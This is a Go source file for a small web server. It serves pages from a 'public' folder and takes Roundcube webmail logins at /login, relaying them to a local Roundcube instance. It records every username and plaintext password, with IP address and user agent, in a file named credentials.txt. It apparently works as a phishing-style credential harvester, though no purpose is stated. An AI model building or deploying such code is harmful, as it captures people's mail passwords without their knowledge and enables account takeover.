package main

import (
	"net/http"
	"net/url"
	"os"
	"time"

	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

func login(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseForm(); err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		log.WithFields(log.Fields{
			"time":  time.Now().Format("2006-01-02 15:04:05"),
			"error": err.Error(),
		}).Error("Failed to parse form")
		return
	}

	username := r.FormValue("_user")
	password := r.FormValue("_pass")

	if username == "" || password == "" {
		http.Error(w, "Username or password missing", http.StatusBadRequest)
		log.WithFields(log.Fields{
			"time": time.Now().Format("2006-01-02 15:04:05"),
		}).Warn("Missing username or password")
		return
	}

	resp, err := sendLoginRequestToRoundube(username, password)
	if err != nil {
		http.Error(w, "Failed to communicate with Rounded", http.StatusInternalServerError)
		log.WithFields(log.Fields{
			"time":  time.Now().Format("2006-01-02 15:04:05"),
			"error": err.Error(),
		}).Error("Failed to communicate with Roundcube")
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
		log.Info("Login to Roundcube successful")
		http.Redirect(w, r, "/success", http.StatusFound)
	} else {
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		log.WithFields(log.Fields{
			"time":   time.Now().Format("2006-01-02 15:04:05"),
			"status": resp.StatusCode,
		}).Warn("Login to Roundcube failed")
	}

	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   username,
		"password":   password,
		"user-agent": r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info("login attempt")

}

func sendLoginRequestToRoundube(username, password string) (*http.Response, error) {
	data := url.Values{}
	data.Set("_user", username)
	data.Set("_pass", password)
	data.Set("_task", "login")
	data.Set("_action", "login")

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.PostForm("http://localhost:8080", data)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func main() {
	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer fh.Close()
	log.SetOutput(fh)
	log.SetFormatter(&log.TextFormatter{
		FullTimestamp: true,
	})

	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))

	log.Info("Starting server on :8000")
	log.Fatal(http.ListenAndServe(":8000", r))
}
